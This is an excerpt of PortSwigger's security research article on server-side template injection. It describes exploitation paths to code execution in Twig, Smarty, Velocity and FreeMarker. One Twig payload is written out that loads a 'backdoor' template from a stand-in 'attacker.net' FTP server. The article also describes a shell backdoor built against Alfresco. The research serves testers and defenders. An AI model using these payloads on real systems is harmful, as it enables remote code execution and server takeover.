...
tags: [article, webseclist-reference, portswigger-research, ssti, sandbox-escape, rce, injection, java, php, nodejs, novel-technique, owasp-a03-2021]
generated:
...
language: ""
licence: unknown
original_url: "http://blog.portswigger.net/2015/08/server-side-template-injection.html"
...
**Published: **Wednesday, 5 August 2015 at 19:00 UTC
...
![Server side Template Injection](https://portswigger.net/cms/images/e5/1f/cf69e88839fc-article-server-side-template-injection-article.png)
...
For a slightly less dry account of this research, you may prefer to watch [my Black Hat USA presentation on this topic](https://www.youtube.com/watch?v=3cT0uE7Y87s). This research is also available as [printable whitepaper](https://portswigger.net/knowledgebase/papers/serversidetemplateinjection.pdf), and you can find an overview with interactive labs in our [Web Security Academy](https://portswigger.net/web-security/server-side-template-injection).

## Introduction

Web applications frequently use template systems such as [Twig](http://twig.sensiolabs.org/) and [FreeMarker](http://freemarker.org/) to embed dynamic content in web pages and emails. Template Injection occurs when user input is embedded in a template in an unsafe manner. Consider a marketing application that sends bulk emails, and uses a Twig template to greet recipients by name. If the name is merely passed in to the template, as in the following example, everything works fine:
...
This vulnerability typically arises through developers intentionally letting users submit or edit templates - some template engines offer a secure mode for this express purpose. It is far from specific to marketing applications - any features that support advanced user-supplied markup may be vulnerable, including wiki-pages, reviews, and even comments. Template injection can also arise by accident, when user input is simply concatenated directly into a template. This may seem slightly counter-intuitive, but it is equivalent to [SQL Injection](https://portswigger.net/web-security/sql-injection) vulnerabilities occurring in poorly written prepared statements, which are a relatively common occurrence. Furthermore, unintentional template injection is extremely easy to miss as there typically won't be any visible cues. As with all input based vulnerabilities, the input could originate from out of band sources. For example, it may occur as a Local File Include (LFI) variant, exploitable through classic LFI techniques such as code embedded in log files, [session files](http://www.ush.it/2008/07/09/local-file-inclusion-lfi-of-session-files-to-root-escalation/), or [/proc/self/env](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/).

The 'Server-Side' qualifier is used to distinguish this from vulnerabilities in client-side templating libraries such as those provided by jQuery and KnockoutJS. Client-side template injection can often be abused for XSS attacks, as [detailed by Mario Heiderich](https://code.google.com/p/mustache-security/). This paper will exclusively cover attacking server-side templating, with the goal of obtaining arbitrary code execution.
...
If there's no builtin self object you're going to have to bruteforce variable names. I have created a wordlist for this by crawling GitHub for GET/POST variable names used in PHP projects, and publicly released it via [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) and Burp Intruder's wordlist collection.
...
In other words, we can chain $class.inspect with $class.type to obtain references to arbitrary objects. We can then execute arbitrary shell commands on the target system using [Runtime.exec()](https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec%28java.lang.String%29). This can be confirmed using the following template, designed to cause a noticeable time delay.
...
Furthermore, we can call arbitrary static methods. Smarty exposes a range of invaluable static classes, including [Smarty_Internal_Write_File](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16), which has the following method:
...
Further code review reveals that the [self::clearConfig()](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L372) method is suitable:
...
The _self object doesn't contain any useful methods, but does have an env attribute that refers to a [Twig_Environment](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php) object, which looks more promising. The [setCache](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L233) method on Twig_Environment can be used to change the location Twig tries to load and execute compiled templates (PHP files) from. An obvious attack is therefore to introduce a Remote File Include vulnerability by setting the cache location to a remote server:

`{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}`

However, modern versions of PHP disable inclusion of remote files by default via [allow_url_include](http://php.net/manual/en/filesystem.configuration.php), so this approach isn't much use.

Further code review reveals a call to the dangerous [call_user_func](http://php.net/manual/en/function.call-user-func.php) function on line 874, in the [getFilter](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874) method. Provided we control the arguments to this, it can be used to invoke arbitrary PHP functions.
...
Thanks to this snippet we can call any method on objects that implement Twig_TemplateInterface, which happens to include _self. The _self object's [displayBlock](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Template.php#L139) method offers a high-level gadget of sorts:
...
[Alfresco](https://www.alfresco.com/) is a content management system (CMS) aimed at corporate users. Low privilege users can chain a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment system with FreeMarker template injection to gain a shell on the webserver. The FreeMarker payload created earlier can be used directly without any modification, but I've expanded it into a classic backdoor that executes the contents of the query string as a shell command:
...
**2020 update:** We've just released some free, interactive labs so you can practise applying these techiques for yourself:

 [ RCE ](https://portswigger.net/research/rce) [ Template Injection ](https://portswigger.net/research/template-injection) [ bounties ](https://portswigger.net/research/bounties) [ 0day ](https://portswigger.net/research/0day) [ scanners ](https://portswigger.net/research/scanners) [ James Favourites ](https://portswigger.net/research/james-kettle) [ Presentations ](https://portswigger.net/research/presentations) [ Black Hat ](https://portswigger.net/research/black-hat)
